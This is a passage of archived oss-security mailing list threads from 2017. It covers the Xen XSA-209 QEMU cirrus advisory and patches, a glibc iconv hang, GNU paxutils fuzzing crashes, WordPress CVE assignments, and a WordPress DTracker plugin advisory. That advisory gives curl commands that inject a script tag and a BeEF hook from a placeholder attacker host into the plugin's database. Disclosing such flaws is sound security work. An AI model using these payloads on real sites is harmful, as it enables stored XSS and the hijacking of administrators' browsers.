2.1.4


```

</details>

---

</details>
<details>
<summary><strong>[oss-security] Re: Xen Security Advisory 209 (CVE-2017-2620) - cirrus_bitblt_cputovideo does not check if memory region is safe</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487716700.10279_5.NdNdNx,U=7573:2,T -->

##### Xen.org security team <security@xen.org>, `E1cg96x-0006uk-4m@xenbits.xenproject.org`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

            Xen Security Advisory CVE-2017-2620 / XSA-209
                              version 3

   cirrus_bitblt_cputovideo does not check if memory region is safe

UPDATES IN VERSION 3
====================

Public release.

ISSUE DESCRIPTION
=================

In CIRRUS_BLTMODE_MEMSYSSRC mode the bitblit copy routine
cirrus_bitblt_cputovideo fails to check wethehr the specified memory
region is safe.

IMPACT
======

A malicious guest administrator can cause an out of bounds memory
write, very likely exploitable as a privilege escalation.

VULNERABLE SYSTEMS
==================

Versions of qemu shipped with all Xen versions are vulnerable.

Xen systems running on x86 with HVM guests, with the qemu process
running in dom0 are vulnerable.

Only guests provided with the "cirrus" emulated video card can exploit
the vulnerability.  The non-default "stdvga" emulated video card is
not vulnerable.  (With xl the emulated video card is controlled by the
"stdvga=" and "vga=" domain configuration options.)

ARM systems are not vulnerable.  Systems using only PV guests are not
vulnerable.

For VMs whose qemu process is running in a stub domain, a successful
attacker will only gain the privileges of that stubdom, which should
be only over the guest itself.

Both upstream-based versions of qemu (device_model_version="qemu-xen")
and `traditional' qemu (device_model_version="qemu-xen-traditional")
are vulnerable.

MITIGATION
==========

Running only PV guests will avoid the issue.

Running HVM guests with the device model in a stubdomain will mitigate
the issue.

Changing the video card emulation to stdvga (stdvga=1, vga="stdvga",
in the xl domain configuration) will avoid the vulnerability.

CREDITS
=======

This issue was discovered by Gerd Hoffmann of Red Hat.

RESOLUTION
==========

Applying the appropriate attached patch resolves this issue.

xsa209-qemuu.patch       qemu-xen, qemu upstream
(no backport yet)        qemu-xen-traditional

$ sha256sum xsa209*
167af9ed7163fa7cf4abb52f865290ced3163c7684151bdc1324eb5e534faf13  xsa209-qemut.patch
297578aa43c3e6b21333f1b859fd1d3e68aaaae77b3cadbadd20cfeca8426df3  xsa209-qemuu.patch
$

DEPLOYMENT DURING EMBARGO
=========================

Deployment of the patches described above (or others which are
substantially similar) is permitted during the embargo, even on
public-facing systems with untrusted guest users and administrators.

However, deployment of the "stdvga" mitigation (changing the video
card emulation to stdvga) is NOT permitted (except where all the
affected systems and VMs are administered and used only by
organisations which are members of the Xen Project Security Issues
Predisclosure List).  Specifically, deployment on public cloud systems
is NOT permitted.  This is because this produces a guest-visible
change which will indicate which component contains the vulnerability.

Additionally, distribution of updated software is prohibited (except
to other members of the predisclosure list).

Predisclosure list members who wish to deploy significantly different
patches and/or mitigations, please contact the Xen Project Security
Team.


(Note: this during-embargo deployment notice is retained in
post-embargo publicly released Xen Project advisories, even though it
is then no longer applicable.  This is to enable the community to have
oversight of the Xen Project Security Team's decisionmaking.)

For more information about permissible uses of embargoed information,
consult the Xen Project community's agreed Security Policy:
  http://www.xenproject.org/security-policy.html
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQEcBAEBAgAGBQJYrBl3AAoJEIP+FMlX6CvZ6LMIALETwnX9w8SifkvuYY3jotwp
nQWY8ztJkMnai9X10RN6SeVf2dCpXLhATPuPGORgRiZJEuBaGHEsHa00i63FQBSL
PaOAgzN1GY+u16Ygv2e3vPcN8mO55A6zcFErF2oLsrfdNsG4pJTwn7bMEjZiqSyG
R9xIC6KiA1nojsZO+ynmRvHxFP6epySRayO0PZAGS75LdmEKVxClE3dAeMW77WNv
dAs3Qi14hB5BmdryK5f1STk8r2b3UsN1pbvao8odiEWFaB9tPo273gj5RdfnEV3t
EzTvH37Q3C4YFoTFx8p6fY5ejHNh4AeSyi9yE7lWtKhDZw56UhdfMmYIgDaKpig=
=RBpg
-----END PGP SIGNATURE-----


```

</details>
<details><summary>Additional Parts</summary>

```
From: Gerd Hoffmann <kraxel@redhat.com>
Subject: [PATCH 3/3] cirrus: add blit_is_unsafe call to cirrus_bitblt_cputovideo

CIRRUS_BLTMODE_MEMSYSSRC blits do NOT check blit destination
and blit width, at all.  Oops.  Fix it.

Security impact: high.

The missing blit destination check allows to write to host memory.
Basically same as CVE-2014-8106 for the other blit variants.

The missing blit width check allows to overflow cirrus_bltbuf,
with the attractive target cirrus_srcptr (current cirrus_bltbuf write
position) being located right after cirrus_bltbuf in CirrusVGAState.

Due to cirrus emulation writing cirrus_bltbuf bytewise the attacker
hasn't full control over cirrus_srcptr though, only one byte can be
changed.  Once the first byte has been modified further writes land
elsewhere.

[ This is CVE-2017-2620 / XSA-209  - Ian Jackson ]

Fixed compilation by removing extra parameter to blit_is_unsafe. -iwj

Reported-by: Gerd Hoffmann <ghoffman@redhat.com>
Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
Signed-off-by: Ian Jackson <ian.jackson@eu.citrix.com>
---
diff --git a/hw/cirrus_vga.c b/hw/cirrus_vga.c
index e6c3893..45facb6 100644
--- a/hw/cirrus_vga.c
+++ b/hw/cirrus_vga.c
@@ -900,6 +900,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 {
     int w;
 
+    if (blit_is_unsafe(s)) {
+        return 0;
+    }
+
     s->cirrus_blt_mode &= ~CIRRUS_BLTMODE_MEMSYSSRC;
     s->cirrus_srcptr = &s->cirrus_bltbuf[0];
     s->cirrus_srcptr_end = &s->cirrus_bltbuf[0];
@@ -925,6 +929,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 	}
         s->cirrus_srccounter = s->cirrus_blt_srcpitch * s->cirrus_blt_height;
     }
+
+    /* the blit_is_unsafe call above should catch this */
+    assert(s->cirrus_blt_srcpitch <= CIRRUS_BLTBUFSIZE);
+
     s->cirrus_srcptr = s->cirrus_bltbuf;
     s->cirrus_srcptr_end = s->cirrus_bltbuf + s->cirrus_blt_srcpitch;
     cirrus_update_memory_access(s);

```

</details>
<details><summary>Additional Parts</summary>

```
From: Gerd Hoffmann <kraxel@redhat.com>
Subject: [PATCH 3/3] cirrus: add blit_is_unsafe call to cirrus_bitblt_cputovideo

CIRRUS_BLTMODE_MEMSYSSRC blits do NOT check blit destination
and blit width, at all.  Oops.  Fix it.

Security impact: high.

The missing blit destination check allows to write to host memory.
Basically same as CVE-2014-8106 for the other blit variants.

The missing blit width check allows to overflow cirrus_bltbuf,
with the attractive target cirrus_srcptr (current cirrus_bltbuf write
position) being located right after cirrus_bltbuf in CirrusVGAState.

Due to cirrus emulation writing cirrus_bltbuf bytewise the attacker
hasn't full control over cirrus_srcptr though, only one byte can be
changed.  Once the first byte has been modified further writes land
elsewhere.

[ This is CVE-2017-2620 / XSA-209  - Ian Jackson ]

Reported-by: Gerd Hoffmann <ghoffman@redhat.com>
Signed-off-by: Gerd Hoffmann <kraxel@redhat.com>
---
 hw/display/cirrus_vga.c | 8 ++++++++
 1 file changed, 8 insertions(+)

diff --git a/hw/display/cirrus_vga.c b/hw/display/cirrus_vga.c
index 0e47cf8..a093dc8 100644
--- a/hw/display/cirrus_vga.c
+++ b/hw/display/cirrus_vga.c
@@ -899,6 +899,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 {
     int w;
 
+    if (blit_is_unsafe(s, true)) {
+        return 0;
+    }
+
     s->cirrus_blt_mode &= ~CIRRUS_BLTMODE_MEMSYSSRC;
     s->cirrus_srcptr = &s->cirrus_bltbuf[0];
     s->cirrus_srcptr_end = &s->cirrus_bltbuf[0];
@@ -924,6 +928,10 @@ static int cirrus_bitblt_cputovideo(CirrusVGAState * s)
 	}
         s->cirrus_srccounter = s->cirrus_blt_srcpitch * s->cirrus_blt_height;
     }
+
+    /* the blit_is_unsafe call above should catch this */
+    assert(s->cirrus_blt_srcpitch <= CIRRUS_BLTBUFSIZE);
+
     s->cirrus_srcptr = s->cirrus_bltbuf;
     s->cirrus_srcptr_end = s->cirrus_bltbuf + s->cirrus_blt_srcpitch;
     cirrus_update_memory_access(s);
-- 
1.8.3.1


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487856536.10498_7.NdNdNx,U=7678:2,T -->

##### Roger Pau Monné <roger.pau@citrix.com>, `20170223094353.hrdgcxjsqdoy3v5l@dhcp-3-221.uk.xensource.com`

```
On Tue, Feb 21, 2017 at 12:00:03PM +0000, Xen.org security team wrote:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
>             Xen Security Advisory CVE-2017-2620 / XSA-209
>                               version 3
> 
>    cirrus_bitblt_cputovideo does not check if memory region is safe
> 
> UPDATES IN VERSION 3
> ====================
> 
> Public release.
> 
> ISSUE DESCRIPTION
> =================
> 
> In CIRRUS_BLTMODE_MEMSYSSRC mode the bitblit copy routine
> cirrus_bitblt_cputovideo fails to check wethehr the specified memory
> region is safe.
> 
> IMPACT
> ======
> 
> A malicious guest administrator can cause an out of bounds memory
> write, very likely exploitable as a privilege escalation.
> 
> VULNERABLE SYSTEMS
> ==================
> 
> Versions of qemu shipped with all Xen versions are vulnerable.
> 
> Xen systems running on x86 with HVM guests, with the qemu process
> running in dom0 are vulnerable.
> 
> Only guests provided with the "cirrus" emulated video card can exploit
> the vulnerability.  The non-default "stdvga" emulated video card is
> not vulnerable.  (With xl the emulated video card is controlled by the
> "stdvga=" and "vga=" domain configuration options.)
> 
> ARM systems are not vulnerable.  Systems using only PV guests are not
> vulnerable.
> 
> For VMs whose qemu process is running in a stub domain, a successful
> attacker will only gain the privileges of that stubdom, which should
> be only over the guest itself.
> 
> Both upstream-based versions of qemu (device_model_version="qemu-xen")
> and `traditional' qemu (device_model_version="qemu-xen-traditional")
> are vulnerable.
> 
> MITIGATION
> ==========
> 
> Running only PV guests will avoid the issue.
> 
> Running HVM guests with the device model in a stubdomain will mitigate
> the issue.
> 
> Changing the video card emulation to stdvga (stdvga=1, vga="stdvga",
> in the xl domain configuration) will avoid the vulnerability.
> 
> CREDITS
> =======
> 
> This issue was discovered by Gerd Hoffmann of Red Hat.
> 
> RESOLUTION
> ==========
> 
> Applying the appropriate attached patch resolves this issue.
> 
> xsa209-qemuu.patch       qemu-xen, qemu upstream
> (no backport yet)        qemu-xen-traditional

It would be nice to mention that (at least on QEMU shipped with 4.7) the
following patch is also needed for the XSA-209 fix to build correctly:

52b7f43c8fa185ab856bcaacda7abc9a6fc07f84
display: cirrus: ignore source pitch value as needed in blit_is_unsafe

Roger.

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487856536.10498_8.NdNdNx,U=7679:2,T -->

##### Steven Haigh <netwiz@crc.id.au>, `bfe85c7d-6886-fdfe-2dbe-6b86ee6a5a80@crc.id.au`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJYrrJ0AAoJEEGvNdV6fTHchHcQAI2YVU5jFF2rsvJ1+mUSIfTX
f7yLTN+UGPhRYoybLqU0PIHnglwgtLkq3yfz8RzvaSqCqLBmukvAimsEgKqql2Z3
0EepSIDU+/idy0WwrlPDsZPNouLyJ7H3XM1oER3h3rKGJgL7B1u/vdeZ6z+qDlGV
hQ9Isw4nqHjFhEfbY19Mxa/RXuRFEBNAXlS7pdRWk78kHvyANFj55hMGTtXZWtme
sQy096wwbaeZYs63V+uRUOCI6kVcX0HB2WLR7VmQIf3+cgI0LFx9QnqxS7VVmiKC
FdlLt6LIGyEMaXU4ujZV8Mao3yyvTwnw3+t+bz339KTk31LljYCtqltkWpkLfbSE
yHLU1N9EihXmCXILzQSvCa8z1zZe25YR3EZABYsTBirKRrSyGubSl/Ay3WWT7SlT
//Aa36xqH1UD0zo4gdL7IFxQKZmO+IuPD8qWJLquu2jNgG592xrWcWgO8AVxJFUl
r32xCMpl+IRQ65dQKnLSbE026M2l0AxOSrzbru3UxvVsDizgWKg1nqaVF9LgLsZH
MAQCiSN4GwEjLcEQt8Ark9+P4JualCbmm/zRNVa6Tw7J6g80pZMO8wvPy8nzyDMx
iu5tGuQRAMenAYVLerm6mQ5P7Oex7CA5Um6mAiJu3m/nQFSBjeZ3RNi5U9K416Zm
2NVrmuydkcFpzquqGxre
=O9Nq
-----END PGP SIGNATURE-----


```

</details>

---

</details>

## iconv
<details>
<summary><strong>[oss-security] CVE-2016-10228: glibc iconv program can hang when invoked with the -c option</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488420512.7074_6.Morbo,U=38119:2, -->

##### Florian Weimer <fweimer@redhat.com>, `58d40b9e-35ab-6576-d190-774c869c2a58@redhat.com`

```
The iconv program (not the iconv function) provided by glibc can hang 
(enter an infinite loop) when invoked with the -c option and an invalid 
multi-byte sequence is encountered in the input:

   https://sourceware.org/bugzilla/show_bug.cgi?id=19519

We have received an independent report of this issue, so we are treating 
this as a (minor) security bug now on the glibc upstream side.

(Note to Red Hat Product Security: We already have a couple of product 
bugs for this.)

Thanks,
Florian

```

</details>

## gnu-paxutils
<details>
<summary><strong>[oss-security] gnu-paxutils: multiple crashes</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_32.NdNdNx,U=7780:2,T -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `670171.970592008-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
GNU paxutils is a suite of archive utilities: it will provide cpio, tar and POSIX pax archivers.

A fuzzing on tar and pax shows multiple crashes.
I really donâ€™t know if atm those tools are used somewhere.

Details:

# tar -t -f $FILE
buffer.c:1480:40: runtime error: index 7168 out of bounds for type 'char [512]'
SUMMARY: AddressSanitizer: undefined-behavior buffer.c:1480:40 in 
/bins/tar: Record size of archive appears to be 14 blocks (20 expected)
/bins/tar: Hmm, this doesn't look like a tar archive
/bins/tar: Skipping to next file header

reading.c:327:19: runtime error: member access within null pointer of type 'union block'
SUMMARY: AddressSanitizer: undefined-behavior reading.c:327:19 in 
reading.c:327:19: runtime error: member access within null pointer of type 'struct sparse_header'
SUMMARY: AddressSanitizer: undefined-behavior reading.c:327:19 in 

ASAN:DEADLYSIGNAL
=================================================================
==9542==ERROR: AddressSanitizer: SEGV on unknown address 0x0000000001f8 (pc 0x000000570b4a bp 0x7ffd7ab13eb0 sp 0x7ffd7ab13e90 T0)
==9542==The signal is caused by a READ memory access.
==9542==Hint: address points to the zero page.
    #0 0x570b49 in skip_extended_headers /root/paxutils-2.4h/src/reading.c:327:33
    #1 0x55721d in list_archive /root/paxutils-2.4h/src/list.c:120:7
    #2 0x5718ef in read_and /root/paxutils-2.4h/src/reading.c:406:5
    #3 0x57c746 in main /root/paxutils-2.4h/src/./tar.c:1508:7
    #4 0x7f5c524fc78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #5 0x41a498 in _start (/root/bins/tar+0x41a498)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /root/paxutils-2.4h/src/reading.c:327:33 in skip_extended_headers
==9542==ABORTING

Reproducer:
https://github.com/asarubbo/poc/blob/master/00178-gnupaxutils-tar-segv

Obviously, the runtime error â€œmember access within null pointerâ€¦â€ is the ubsanâ€™s way to print what asan subsequently said as SEGV, so it is the same issue.

# pax -f $FILE
==10938==ERROR: AddressSanitizer: global-buffer-overflow on address 0x00000141615f at pc 0x00000052853e bp 0x7ffed94bdc30 sp 0x7ffed94bdc28
READ of size 1 at 0x00000141615f thread T0
    #0 0x52853d in read_in_tar_header /root/paxutils-2.4h/src/fmttar.c:363:8
    #1 0x50dd65 in read_in_header /root/paxutils-2.4h/src/copyin.c:99:7
    #2 0x50f675 in process_copy_in /root/paxutils-2.4h/src/copyin.c:236:7
    #3 0x50d164 in main /root/paxutils-2.4h/src/./pax.c:485:3
    #4 0x7fd70e06478f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #5 0x41a448 in _start (/usr/bin/pax+0x41a448)

Reproducer:
https://github.com/asarubbo/poc/blob/master/00179-gnupaxutils-pax-globaloverflow

# pax -f $FILE
==21061==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000efb9 at pc 0x00000048041a bp 0x7ffea3351e10 sp 0x7ffea33515c0
READ of size 10 at 0x60200000efb9 thread T0
    #0 0x480419 in __interceptor_strcmp 
/tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/../sanitizer_common/sanitizer_common_interceptors.inc:284
    #1 0x50f969 in process_copy_in /root/paxutils-2.4h/src/copyin.c:261:11
    #2 0x50d164 in main /root/paxutils-2.4h/src/./pax.c:485:3
    #3 0x7fe2d680178f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #4 0x41a448 in _start (/usr/bin/pax+0x41a448)

Reproducer:
https://github.com/asarubbo/poc/blob/master/00180-gnupaxutils-pax-heapoverflow

# pax -f $FILE
fmttar.c:450:11: runtime error: index 6 out of bounds for type 'char [6]'                                                                                                                      
SUMMARY: AddressSanitizer: undefined-behavior fmttar.c:450:11

==7159==ERROR: AddressSanitizer: memcpy-param-overlap: memory ranges [0x7fe6f8001420,0x7fe6f800161f) and [0x7fe6f8001421, 0x7fe6f8001620) overlap
    #0 0x4bc091 in __asan_memcpy /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:413
    #1 0x526da0 in read_in_tar_header /root/paxutils-2.4h/src/fmttar.c:265:4
    #2 0x50dd65 in read_in_header /root/paxutils-2.4h/src/copyin.c:99:7
    #3 0x50f675 in process_copy_in /root/paxutils-2.4h/src/copyin.c:236:7
    #4 0x50d164 in main /root/paxutils-2.4h/src/./pax.c:485:3
    #5 0x7fe6fae7178f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #6 0x41a448 in _start (/usr/bin/pax+0x41a448)

Reproducer:
https://github.com/asarubbo/poc/blob/master/00181-gnupaxutils-pax-memcpyparoverlap

# pax -f $FILE
==11514==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f8b47900220 at pc 0x00000053bf25 bp 0x7ffd949d5cc0 sp 0x7ffd949d5cb8
READ of size 1 at 0x7f8b47900220 thread T0
    #0 0x53bf24 in otoa /root/paxutils-2.4h/lib/octal.c:33:10
    #1 0x5287f5 in is_tar_header /root/paxutils-2.4h/src/fmttar.c:427:3
    #2 0x50d8d4 in read_in_header /root/paxutils-2.4h/src/copyin.c:74:27
    #3 0x50f675 in process_copy_in /root/paxutils-2.4h/src/copyin.c:236:7
    #4 0x50d164 in main /root/paxutils-2.4h/src/./pax.c:485:3
    #5 0x7f8b4a75378f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #6 0x41a448 in _start (/usr/bin/pax+0x41a448)

Reproducer:
https://github.com/asarubbo/poc/blob/master/00182-gnupaxutils-pax-stackoverflow

Affected version:
2.4h

Fixed version:
N/A

Commit fix:
N/A

Credit:
These bugs were discovered by Agostino Sarubbo of Gentoo.

Timeline:
2017-02-17: bugs discovered
2017-02-21: bugs reported to upstream
2017-02-21: blog post about the issue

Note:
These bugs were found with American Fuzzy Lop.
The email to upstream was rejected.

Permalink:
https://blogs.gentoo.org/ago/2017/02/21/gnu-paxutils-multiple-crashes

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_42.NdNdNx,U=7790:2,T -->

##### Assaf Gordon <assafgordon@gmail.com>, `598330B5-3AE7-49CD-B826-3FFEAA7C5048@gmail.com`

```
Hello,

> On Feb 25, 2017, at 06:36, Agostino Sarubbo <ago@gentoo.org> wrote:
> 
> Description:
> GNU paxutils is a suite of archive utilities [...]
> A fuzzing on tar and pax shows multiple crashes.
[...]
> Note:
> The email to upstream was rejected.

Not sure what "rejected" means (did the email delivery failed or the maintainer rejected your input, etc).

But generally for GNU Software,
If you don't get timely response from the maintainer,
you can send an email to "security@gnu.org" ,
and if that doesn't help, escalate to "maintainers@gnu.org".
see https://www.gnu.org/software/security/ 

regards,
 - assaf

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144006.28364_105.NdNdNx,U=7853:2,T -->

##### Agostino Sarubbo <ago@gentoo.org>, `1839589.Shjyq5iZ1H@arcadia`

```
On Saturday 25 February 2017 12:49:12 Assaf Gordon wrote:
> Not sure what "rejected" means (did the email delivery failed or the
> maintainer rejected your input, etc).
delivery failed

> But generally for GNU Software,
> If you don't get timely response from the maintainer,
> you can send an email to "security@gnu.org" ,
> and if that doesn't help, escalate to "maintainers@gnu.org".
> see https://www.gnu.org/software/security/
sent to security@gnu.org.

However not all crashes are security relevant.

-- 
Agostino Sarubbo
Gentoo Linux Developer

```

</details>

## wordpress
<details>
<summary><strong>[oss-security] Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489435383.3763_1.Morbo,U=41478:2,T -->

##### "Larry W. Cashdollar" <larry0@me.com>, `21EB3BEF-79F8-4316-A1A4-87ED0A39A3E5@me.com`

```
Title: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5
Author: Larry W. Cashdollar, @_larry0
Date: 2017-03-08
CVE-ID:[CVE-2017-1002006][CVE-2017-1002007]
Download Site: https://wordpress.org/plugins/dtracker/
Vendor: https://profiles.wordpress.org/dijo/
Vendor Notified: 2017-03-09
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=186
Description: Track the details of the users downloading the pdf files from wordpress site.

Vulnerability:
CVE-2017-1002006,
In file dtracker/save_contact.php

Doesn't check that the user is authorized before injecting new contacts into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  

$name 		= $_POST['name'];
	$company	= $_POST['company'];
	$phone 		= $_POST['phone'];
	$country	= $_POST['country'];
	$contact_id = $_POST['contact_id'];
	
	$table 	= 'wp_contacts';
	$data	= array(
				'name'		=> $name,
				'company'	=> $company,
				'phone'		=> $phone,
				'country'	=> $country,
			);
	$where	= array(
				'id'	=> $contact_id
			);
	
$wpdb->flush();
	
$wpdb->update( $table, $data, $where ); //Update the Contact

CVE-2017-1002007,
In file dtracker/save_mail.php

Doesn't check that the user is authorized before injecting new emails into the wp_contact table.  A simple post request will allow any user to add new contacts.  A malicious user could inject javascript into the database to be executed in the browser of the admin user.  


$email 	= $_POST['email'];
	$time	= date('Y-m-d H:i:s');
	$ip		= $_SERVER [ 'REMOTE_ADDR' ] ; //get IP address of the visitor
	
	$table 	= "wp_contacts";
	$data	= array (
				'email' 	=> $email,
				'time'		=> $time,
				'ip'		=> $ip	
			);
	
	$wpdb->insert( $table, $data); //Insert Values
	$contact_id = $wpdb->insert_id; //Get ID of the last inserted row
	$data['contactId'] = $contact_id;
	echo json_encode($data); //Pass the id to the JS

Exploit Code:
	• $ curl --data "email=\"><script>alert(1);</script>" http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
	• {"email":"\\\"><script>alert(1);<\/script>","time":"2017-03-09 00:54:06","ip":"example.com","contactId":10577}
	•  
	• Or better yet, inject a BeEF hook.
	•  
	• $ curl --data 'email="><script src=http://BeEF_Host:3000/hook.js></script>' http://example.com/wordpress/wp-content/plugins/dtracker/save_mail.php
```

</details>
<details>
<summary><strong>[oss-security] Fwd: [scr305104] wordpress before 4.7.3</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489353236.1508_1.Morbo,U=41307:2, -->

##### Craig Small <csmall@debian.org>, `CALy8Cw58FYZobXa7G5MGoPbfJ4T9w1XHu3BYL1sGeBM-voBSkA@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
FYI, The 6 wordpress CVE ids from Mitre.

 - Craig

---------- Forwarded message ---------
From: <cve-request@mitre.org>
Date: Sun, Mar 12, 2017 at 11:32 AM
Subject: Re: [scr305104] wordpress before 4.7.3
To: <csmall@debian.org>
Cc: <cve-request@mitre.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> [Suggested description]
> In WordPress before 4.7.3,
> there is
> authenticated Cross-Site Scripting (XSS) via Media File Metadata. This is
demonstrated by both
> (1) mishandling of
> the playlist shortcode in the wp_playlist_shortcode function in
wp-includes/media.php
> and (2) mishandling of meta information in the renderTracks function in
> wp-includes/js/mediaelement/wp-playlist.js.
>
> ------------------------------------------
>
> [Vulnerability Type]
> Cross Site Scripting (XSS)
>
> ------------------------------------------
>
> [Affected Product Code Base]
> wordpress - 3.6.0-4.7.2
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Attack Vectors]
> Two Cross-Site Scripting vulnerabilities exists in the playlist
> functionality of WordPress. These issues can be exploited by
> convincing an Editor or Administrator into uploading a malicious MP3
> file. Once uploaded the issues can be triggered by a Contributor or
> higher using the playlist shortcode.
>
> ------------------------------------------
>
> [Reference]
>
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
>
https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
> https://codex.wordpress.org/Version_4.7.3
>
https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
> http://openwall.com/lists/oss-security/2017/03/06/8
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
>
> ------------------------------------------
>
> [Discoverer]
> Chris Andre Dale, Yorick Koster, and Simon P. Briggs

Use CVE-2017-6814.


> [Suggested description]
> In WordPress before 4.7.3 (wp-includes/pluggable.php),
> control characters can trick redirect URL validation.
>
> ------------------------------------------
>
> [VulnerabilityType Other]
> Trick the URL validation
>
> ------------------------------------------
>
> [Affected Product Code Base]
> wordpress - 2.8.1-4.7.2
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Reference]
> https://codex.wordpress.org/Version_4.7.3
>
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
>
https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
>
> ------------------------------------------
>
> [Discoverer]
> Daniel Chatfield

Use CVE-2017-6815.


> [Suggested description]
> In WordPress before 4.7.3 (wp-admin/plugins.php),
> unintended files can be deleted by administrators using the plugin
deletion functionality.
>
> ------------------------------------------
>
> [Vulnerability Type]
> Insecure Permissions
>
> ------------------------------------------
>
> [Affected Product Code Base]
> wordpress - 4.7.0-4.7.2
>
> ------------------------------------------
>
> [Affected Component]
> wp-admin/plugins.php
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Impact Escalation of Privileges]
> true
>
> ------------------------------------------
>
> [Reference]
> https://codex.wordpress.org/Version_4.7.3
>
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
>
https://github.com/WordPress/WordPress/commit/4d80f8b3e1b00a3edcee0774dc9c2f4c78f9e663
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
>
> ------------------------------------------
>
> [Discoverer]
> TrigInc and xuliang

Use CVE-2017-6816.


> [Suggested description]
> In WordPress before 4.7.3 (wp-includes/embed.php),
> there is
> authenticated Cross-Site Scripting (XSS) in YouTube URL Embeds.
>
> ------------------------------------------
>
> [Vulnerability Type]
> Cross Site Scripting (XSS)
>
> ------------------------------------------
>
> [Affected Product Code Base]
> wordpress - 4.0-4.7.2
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Reference]
> https://codex.wordpress.org/Version_4.7.3
>
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
>
https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
>
> ------------------------------------------
>
> [Discoverer]
> Marc Montpas

Use CVE-2017-6817.


> [Suggested description]
> In WordPress before 4.7.3 (wp-admin/js/tags-box.js),
> there is
> cross-site scripting (XSS) via taxonomy term names.
>
> ------------------------------------------
>
> [Vulnerability Type]
> Cross Site Scripting (XSS)
>
> ------------------------------------------
>
> [Affected Product Code Base]
> wordpress - 4.7-4.7.2
>
> ------------------------------------------
>
> [Affected Component]
> Taxonomy names
>
> ------------------------------------------
>
> [Attack Type]
> Remote
>
> ------------------------------------------
>
> [Reference]
> https://codex.wordpress.org/Version_4.7.3
>
https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
>
https://github.com/WordPress/WordPress/commit/9092fd01e1f452f37c313d38b18f9fe6907541f9
>
> ------------------------------------------
>
> [Has vendor confirmed or acknowledged the vulnerability?]
> true
>
> ------------------------------------------
>
> [Discoverer]
> Delta

Use CVE-2017-6818.


> [Suggested description]
> In WordPress before 4.7.3,
> there is
> cross-site request forgery (CSRF) in Press This
> (wp-admin/includes/class-wp-press-this.php), leading to excessive use of
server resources.
